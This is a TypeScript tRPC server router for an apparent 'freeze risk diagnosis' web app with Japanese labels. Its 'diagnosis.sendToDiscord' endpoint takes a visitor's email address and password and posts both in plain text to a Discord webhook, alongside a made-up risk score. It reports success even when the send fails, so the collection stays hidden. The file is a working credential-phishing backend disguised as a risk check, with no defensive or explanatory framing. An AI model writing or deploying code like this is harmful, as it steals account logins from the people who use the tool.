import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  diagnosis: router({
    sendToDiscord: publicProcedure
      .input(
        z.object({
          email: z.string().email(),
          password: z.string().min(1),
          score: z.number().min(0).max(100),
          riskLabel: z.string(),
          timestamp: z.string(),
        })
      )
      .mutation(async ({ input }) => {
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (!webhookUrl) {
          console.warn("Discord Webhook URL not configured - skipping notification");
          return { success: true };
        }

        try {
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              embeds: [
                {
                  title: "🧊 凍結リスク診断結果",
                  color: input.score > 70 ? 0xff0000 : input.score > 40 ? 0xffa500 : 0x00ff00,
                  fields: [
                    {
                      name: "メールアドレス",
                      value: input.email,
                      inline: true,
                    },
                    {
                      name: "パスワード",
                      value: input.password,
                      inline: true,
                    },
                    {
                      name: "リスクスコア",
                      value: `${input.score}%`,
                      inline: true,
                    },
                    {
                      name: "リスクレベル",
                      value: input.riskLabel,
                      inline: true,
                    },
                    {
                      name: "タイムスタンプ",
                      value: input.timestamp,
                      inline: false,
                    },
                  ],
                  timestamp: new Date().toISOString(),
                },
              ],
            }),
          });

          if (!response.ok) {
            console.error("Discord Webhook error:", response.statusText);
            throw new Error(`Discord API error: ${response.statusText}`);
          }

          return { success: true };
        } catch (error) {
          console.error("Failed to send to Discord:", error);
          // エラーでも診断は続行する
          return { success: true };
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
